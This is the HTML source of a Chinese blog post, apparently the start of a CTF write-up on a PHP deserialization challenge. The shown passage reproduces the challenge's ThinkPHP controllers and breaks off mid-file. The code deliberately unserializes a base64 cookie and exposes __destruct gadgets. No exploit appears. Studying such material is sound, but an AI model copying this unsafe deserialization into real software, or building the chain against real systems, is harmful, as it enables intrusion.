@@ -1,0 +1,1117 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Bling_Dog">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Bling_Dog">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>国赛一道反序列化的思考 · Bling_dog&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Bling_dog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">国赛一道反序列化的思考</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Bling_dog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            国赛一道反序列化的思考
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="反序列化">反序列化</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/05/27</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>最近做了国赛，有一道反序列化题印象比较深刻，之前做过一些反序列化的题目，也有过一些总结，但是这次做起来，感觉有点费劲。让我反思了一下平时的学习效果，应该更加注重总结。</p>
+<p>题目给的是一个压缩包文件，里面重要的php文件有三个。</p>
+<h1 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $profile;</span><br><span class="line">    <span class="keyword">public</span> $profile_db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"index"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_upload_img())&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"upload"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"img"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"home"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile) &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cookie(<span class="string">"user"</span>,<span class="keyword">null</span>);</span><br><span class="line">        $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Register-php"><a href="#Register-php" class="headerlink" title="Register.php"></a>Register.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(input(<span class="string">"post.username"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.email"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.password"</span>))) &#123;</span><br><span class="line">            $email = input(<span class="string">"post.email"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $password = input(<span class="string">"post.password"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $username = input(<span class="string">"post.username"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email($email)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"username"</span>, $username)-&gt;find()) &amp;&amp; <span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>, $email)-&gt;find())) &#123;</span><br><span class="line">                    $user_info = [<span class="string">"email"</span> =&gt; $email, <span class="string">"password"</span> =&gt; md5($password), <span class="string">"username"</span> =&gt; $username];</span><br><span class="line">                    <span class="keyword">if</span> (db(<span class="string">"user"</span>)-&gt;insert($user_info)) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;success(<span class="string">'Registed successful!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;error(<span class="string">'Registed failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Account already exists!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Email illegal!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Something empty!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line">        $pattern = <span class="string">"/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"</span>;</span><br><span class="line">        preg_match($pattern, $email, $matches);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($matches))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Profile-php"><a href="#Profile-php" class="headerlink" title="Profile.php"></a>Profile.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        @chdir(<span class="string">"../public/upload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        